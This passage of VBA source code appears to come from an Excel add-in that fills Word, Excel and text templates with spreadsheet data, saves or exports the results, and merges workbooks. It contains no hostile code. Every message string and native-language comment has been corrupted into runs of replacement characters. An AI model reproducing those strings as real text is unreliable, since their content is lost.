                        pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd|" & bm.Name & "|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & rc - i + 1 & " |fffd||fffd| " & rc&
                        'Debug.Print "|fffd||fffd||fffd||fffd||fffd| |fffd|" & bm.Name & "|fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| " & rc - i + 1 & " |fffd||fffd| " & rc&

                        MColValue$ = "": MColValue$ = Trim(SourceRows.Cells(i, Mcol&).Text)        ' |fffd||fffd||fffd| Multirow |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        If (Mcol& = 0) Or (Len(MColValue$) > 0) Then
                            With bm.Range
                                .InsertParagraphAfter
                                With .Paragraphs.First.Next
                                    .Range.InsertCrossReference ReferenceType:=2, ReferenceKind:=-1, _
                                                                ReferenceItem:=bm.Name, InsertAsHyperlink:=False, _
                                                                IncludePosition:=False, SeparateNumbers:=False, SeparatorString:=" "
                                    .Range.Fields.Unlink
                                End With
                                WordReplacements .Paragraphs.First.Next.Range, "#}", "#" & i & "}"
                                WordReplacements .Paragraphs.First.Next.Range, "{%index%}", i
                            End With
                            DoEvents
                        End If
                    Next
                    bm.Range.Delete
                End If
                DoEvents
            End If
        Next
        ProcessTime1$ = Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|."
    End If

    pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|..."
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Dir(TemplateFilename$, vbNormal)

    Dim arr, FullReplace As Boolean, Replace_LF_with$, key$, txt$, File_Format As Long, lngJunk As Long, oShp As Object, rangeColl As Collection
    arr = options.Keys

    Replace_LF_with$ = Replace(SETT.GetText("ComboBox_LineFeed"), "del", "")
    FullReplace = SETT.GetBoolean("CheckBox_ReplaceInColon")

    TimeStamp = Timer
    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = options(arr(i))
        txt$ = Replace(txt$, Chr(10), Replace_LF_with$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        Err.Clear

        pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|... (" & i + 1 & " / " & UBound(arr) + 1 & ")"
        If HasLinkToObject(txt$, key$) Then
            InsertObjectIntoDOC doc, txt$, key$, pi
            Err.Clear
        Else
            If FullReplace Then
                ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|

                lngJunk = doc.Sections(1).Headers(1).Range.StoryType    'Fix the skipped blank Header/Footer problem

                Set rangeColl = New Collection
                For Each myStoryRange In doc.StoryRanges
                    rangeColl.Add myStoryRange
                Next

                For Each myStoryRange In rangeColl          'For Each myStoryRange In doc.StoryRanges
                    Do
                        DoEvents
                        WordReplacements myStoryRange, key$, txt$

                        If SETT.GetBoolean("CheckBox_ReplaceInColonShapes") Then
                            DoEvents
                            Select Case myStoryRange.StoryType
                                Case 6, 7, 8, 9, 10, 11
                                    If myStoryRange.ShapeRange.Count > 0 Then
                                        Dim Line3$, shapeindex&
                                        shapeindex& = 0: Line3$ = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (XXX / " & myStoryRange.ShapeRange.Count & ")"
                                        For Each oShp In myStoryRange.ShapeRange
                                            If oShp.TextFrame.HasText Then WordReplacements oShp.TextFrame.TextRange, key$, txt$
                                            shapeindex& = shapeindex& + 1: If shapeindex& Mod 10 = 0 Then pi.Line3 = Replace(Line3$, "XXX", shapeindex&)
                                        Next
                                        pi.Line3 = ""
                                    End If
                                Case Else
                                    'Do Nothing
                            End Select
                        End If

                        Set myStoryRange = myStoryRange.NextStoryRange    'Get next linked story (if any)
                    Loop Until myStoryRange Is Nothing

                    '    WordReplacements myStoryRange, key$, txt$
                    '    While Not (myStoryRange.NextStoryRange Is Nothing)
                    '        DoEvents
                    '        Set myStoryRange = myStoryRange.NextStoryRange
                    '        WordReplacements myStoryRange, key$, txt$
                    '    Wend
                Next myStoryRange
                Set rangeColl = Nothing

            Else
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                'doc.Range.Find.Execute key$, False, , False, , , , , , txt$, 2
                WordReplacements doc.Range, key$, txt$
            End If
        End If


        If Err Then
            If (Err.Number = 4605) And SETT.GetBoolean("CheckBox_InsertIntoFields") Then
            Else
                ecount = ecount + 1
                pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd| " & Err.Number & " |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| " & key$ & ": " & Err.Description
            End If
        End If

    Next i


    If SETT.GetBoolean("CheckBox_InsertIntoFields") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim ff As Object, k As Variant
        For Each ff In doc.Fields
            If ff.result.Text Like "*{*}*" Then
                txt$ = ff.result.Text
                For Each k In options.Keys
                    txt = Replace(txt, k, options(CStr(k)))
                Next
                ff.result.Text = txt$
            End If
        Next
    End If

    ProcessTime2$ = Format(Timer - TimeStamp, "0.00") & " |fffd||fffd||fffd|."

    doc.ActiveWindow.View.ShowFieldCodes = False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|

    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    doc.ActiveWindow.ActivePane.View.SeekView = 9  ' wdSeekCurrentPageHeader
    doc.ActiveWindow.ActivePane.View.SeekView = 0    ' wdSeekMainDocument


    pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Split(NewFilename$, "\")(UBound(Split(NewFilename$, "\")))
    Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Replace(NewFilename$, OUTPUT_FOLDER$, "...\")
    pi.FP.Repaint

    If Val(Application.Version) > 11 And (SETT.GetBoolean("CheckBox_PDF") Or (Val(AllOptions("{%pdf%}")) = 1)) Then        ' |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|
        doc.ExportAsFixedFormat NewFilename$, 17
    Else        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word
        File_Format = GetFileFormatForNewFile(NewFilename$)
        'Debug.Print File_Format
        If Len(File_Format) Then
            doc.SaveAs NewFilename$, Val(File_Format)
        Else
            doc.SaveAs NewFilename$
        End If
    End If
    If SETT.GetBoolean("CheckBox_ImmediatePrintOut") Then doc.PrintOut Copies:=PrintCopiesCount(AllOptions)
    doc.Close False

    If SETT.GetBoolean("CheckBox_MultiRow") Then
        Main_PI.Log vbTab & "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & ProcessTime1$ & ", |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|: " & ProcessTime2$ & ")"
        Main_PI.Repaint
    End If
    CreateAndFill_DOC = (Err = 0 And ecount = 0)
End Function

Sub WordReplacements(rng As Object, ByVal FindText As String, ByVal ReplaceText As String)
    On Error Resume Next: Dim HL As Object, addr$
    ReplaceText = Replace(ReplaceText, "^", "^^")
    rng.Find.Execute FindText:=FindText, ReplaceWith:=ReplaceText, MatchWildcards:=False, Replace:=2
    Exit Sub
    If SETT.GetBoolean("CheckBox_ReplaceCodesInHyperlinks") Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        ' rng.Find.Execute FindText:=Replace(Replace(FindText, "{", "%7b"), "}", "%7d"), ReplaceWith:=ReplaceText, Replace:=2
        For Each HL In rng.Hyperlinks
            addr$ = HL.Address
            If (addr$ Like "*{*}*") Or (addr$ Like "*%7b*%7d*") Then
                addr$ = Replace(Replace(addr$, "%7b", "{"), "%7d", "}")
                HL.Address = Replace(addr$, FindText, ReplaceText)
            End If
        Next
        rng.Document.ActiveWindow.View.ShowFieldCodes = False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        rng.Find.Execute FindText:=FindText, ReplaceWith:=ReplaceText, MatchWildcards:=False, Replace:=2
        rng.Document.ActiveWindow.View.ShowFieldCodes = True        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    End If
End Sub


Function CreateAndFill_TXT(ByVal TemplateFilename$, ByVal NewFilename$, _
                           ByRef options As Dictionary, Optional ByRef pi As ProgressIndicator) As Boolean

    On Error Resume Next: Err.Clear
    Dim TextFile$, arr, i&, key$, txt$
    pi.Line3 = "|fffd||fffd||fffd||fffd|: " & Dir(TemplateFilename$, vbNormal)

    pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    TextFile$ = ReadTXTfile(TemplateFilename$)

    pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| ..."
    arr = options.Keys
    For i = LBound(arr) To UBound(arr)
        key$ = arr(i)
        txt$ = options(arr(i))
        TextFile$ = Replace(TextFile$, key$, txt$, , , vbTextCompare)
    Next i

    pi.line2 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ..."
    pi.Line3 = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Split(NewFilename$, "\")(UBound(Split(NewFilename$, "\")))
    Main_PI.Log vbTab & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & Replace(NewFilename$, OUTPUT_FOLDER$, "...\")
    pi.FP.Repaint
    SaveTXTfile NewFilename$, TextFile$
    CreateAndFill_TXT = Err = 0
End Function

Function TemplateType(ByVal filename$) As String
    Select Case FWF.GetFileExtension(filename$)
        Case "XLS", "XLSM", "XLSX", "XLSB", "CSV": TemplateType = "XLS"
        Case "XLT", "XLTM", "XLTX": TemplateType = "XLS-template"
        Case "DOC", "DOCM", "DOCX", "DOCB", "DOCXML", "RTF": TemplateType = "DOC"
        Case "DOT", "DOTM", "DOTX": TemplateType = "DOC-template"
        Case "TXT", "DAT", "XML", "INI": TemplateType = "TXT"
    End Select
End Function

Function TemplateTypeForListbox(ByVal filename$) As String
    Select Case FWF.GetFileExtension(filename$)
        Case "XLS", "XLSM", "XLSX", "XLSB", "CSV": TemplateTypeForListbox = "Excel"
        Case "XLT", "XLTM", "XLTX": TemplateTypeForListbox = "Excel"
        Case "DOC", "DOCM", "DOCX", "DOCB", "DOCXML", "RTF": TemplateTypeForListbox = "Word"
        Case "DOT", "DOTM", "DOTX": TemplateTypeForListbox = "Word"
        Case "TXT", "DAT", "XML", "INI": TemplateTypeForListbox = "Text"
        Case Else: TemplateTypeForListbox = "?"
    End Select
End Function

Function CheckTemplateFiles(ByRef coll As Collection) As Boolean
    On Error Resume Next

    Dim msg$, i&, filename$, ttype$, n&, ttl$
    If coll.Count = 0 And Not SETT.GetBoolean("CheckBox_SendEmail") Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.    " & _
               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$
        MsgBox msg, vbCritical, "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        ShowSettingsPage
        Exit Function
    End If

    If SETT.GetBoolean("CheckBox_ProcessUnsupportedTemplates") Then CheckTemplateFiles = True: Exit Function

    For i = coll.Count To 1 Step -1
        filename$ = coll(i)
        ttype$ = TemplateType(filename)
        If ttype$ = "" Then
            n& = n& + 1
            Select Case n
                Case Is < 4: msg$ = msg$ & Replace(filename, TEMPLATES_FOLDER$, "") & vbNewLine
                Case 4: msg$ = msg$ & "|fffd| |fffd|.|fffd|." & vbNewLine
                Case Else
            End Select

            coll.Remove i
        End If
    Next i

    '    If coll.Count > 200 Then
    '        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (" & coll.Count & " |fffd||fffd|.)    " & _
             '               vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
             '               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$ & _
             '               vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?"
    '        ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|?"
    '
    '        If MsgBox(msg, vbExclamation + vbDefaultButton2 + vbOKCancel, ttl$) = vbCancel Then
    '            Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & coll.Count
    '            ShowSettingsPage
    '            Exit Function
    '        End If
    '
    '        If coll.Count > 500 Then
    '            msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (" & coll.Count & " |fffd||fffd|.)    " & _
                 '                   vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                 '                   "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$ & _
                 '                   vbNewLine & vbNewLine & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    '            ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - 500 |fffd||fffd|."
    '
    '            MsgBox msg, vbExclamation, ttl$
    '            Exit Function
    '        End If
    '    End If

    If Len(msg) Then
        msg$ = "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & n & " |fffd||fffd|.):    " & _
               vbNewLine & vbNewLine & msg$ & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|?" & vbNewLine & vbNewLine & _
               "|fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|):" & vbNewLine & TEMPLATES_FOLDER$
        ttl$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        If MsgBox(msg, vbExclamation + vbYesNo + vbDefaultButton2, ttl$) = vbYes Then
            CheckTemplateFiles = True
        End If
    Else
        CheckTemplateFiles = True
    End If
End Function

Function GetFolder(ByVal DefaultName$, ByVal DefaultSettingName$, ByVal SettingName$, Optional ByVal ForTextbox As Boolean = False) As String
    On Error Resume Next
    Dim DefaultFolderName$, Folder$
    With SETT
        DefaultFolderName$ = .GetText(DefaultSettingName$, DefaultName$, "Setup")
        If Trim(DefaultFolderName$) = "" Then DefaultFolderName$ = DefaultName$

        If .GetBoolean("CheckBox_UseCurrentFolder") Then    ' USE_CURRENT_FOLDER
            If ForTextbox Then GetFolder = "<" & tt("CONST_ActiveFolder") & ">\" & DefaultFolderName$ & "\": Exit Function
            If ActiveWorkbook Is Nothing Then Exit Function
            If ActiveWorkbook.Path = "" Then Exit Function
            GetFolder = ActiveWorkbook.Path & "\" & DefaultFolderName$ & "\"
            Err.Clear: Exit Function
        End If

        .AddDefaultValue SettingName$, ThisWorkbook.Path & "\" & DefaultFolderName$ & "\", , True
        Folder$ = .GetText(SettingName$)
        If Dir(Folder$, vbDirectory) = "" Then MkDir Folder$
        If Dir(Folder$, vbDirectory) = "" Then
            Folder$ = ThisWorkbook.Path & "\" & DefaultFolderName$ & "\"
            .SetText SettingName$, Folder$
            MkDir Folder$
        End If
        GetFolder = Folder$
    End With
End Function

Function OUTPUT_FOLDER$(Optional ByVal ForTextbox As Boolean = False)    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    OUTPUT_FOLDER$ = GetFolder("Documents", "OUTPUT_FOLDER", "TextBox_OutputFolder", ForTextbox)
End Function

Function TEMPLATES_FOLDER$(Optional ByVal ForTextbox As Boolean = False)
    TEMPLATES_FOLDER$ = GetFolder("Templates", "TEMPLATE_FOLDER", "TextBox_TemplatesFolder", ForTextbox)
End Function


Function TABLES_FOLDER$()
    On Error Resume Next
    TABLES_FOLDER$ = SETT.GetText("TextBox_TablesFolder")
    If Dir(TABLES_FOLDER$, vbDirectory) = "" Then MkDir TABLES_FOLDER$
End Function

Function IMAGES_FOLDER$()
    IMAGES_FOLDER$ = SETT.GetText("TextBox_ImagesFolder")
End Function
Function WORDDOC_FOLDER$()
    WORDDOC_FOLDER$ = SETT.GetText("TextBox_WordDocFolder")
End Function

Function USE_CURRENT_FOLDER() As Boolean
    USE_CURRENT_FOLDER = SETT.GetBoolean("CheckBox_UseCurrentFolder")
End Function

Function HEADER_ROW() As Long
    On Error Resume Next
    HEADER_ROW = SETT.GetNumber("ComboBox_FirstRow")
    If HEADER_ROW = 0 Then HEADER_ROW = 1
End Function

Function FullDate(ByVal d As Date) As String
    Application.Volatile True
    FullDate = Format(d, "|fffd|DD|fffd| mmmm yyyy |fffd||fffd||fffd||fffd|")
End Function

Function LineFeedOptions()
    On Error Resume Next
    ReDim arr(1 To 5, 1 To 2)
    arr(1, 1) = " ": arr(1, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(2, 1) = Chr(13): arr(2, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(3, 1) = Chr(11): arr(3, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(4, 1) = Chr(31): arr(4, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(5, 1) = "del": arr(5, 2) = "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>"
    LineFeedOptions = arr
End Function


Function CombineXLSsheets(ByRef coll As Collection) As String
    On Error Resume Next: Err.Clear
    Dim NewFilename$, File_Format&

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    NewFilename$ = Replace_symbols(SETT.GetText("TextBox_CombineXLS_filename"))
    If Not NewFilename$ Like "*.xls*" Then NewFilename$ = NewFilename$ & IIf(Val(Application.Version) >= 12, ".xlsx", ".xls")
    NewFilename$ = OUTPUT_FOLDER$ & NewFilename$

    If coll.Count = 1 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        Name coll(1) As NewFilename$
        Exit Function
    End If

    Dim WB As Workbook, commonWB As Workbook, sh As Worksheet, filename, fname$, shname$
    Set commonWB = Application.Workbooks.Add(xlWBATWorksheet)
    For Each filename In coll
        fname$ = Dir(filename, vbNormal)
        If Len(fname$) > 0 And (fname$ Like "*?.xls*") Then
            shname$ = Left(fname$, InStrRev(fname$, ".") - 1)
            Set WB = Workbooks.Open(filename, False, True)
            If Not WB Is Nothing Then
                '  For Each sh In WB.Worksheets : : Next sh
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                Err.Clear: WB.Worksheets(1).Copy , commonWB.Worksheets(commonWB.Worksheets.Count)
                If Err = 0 Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Set sh = commonWB.Worksheets(commonWB.Worksheets.Count)
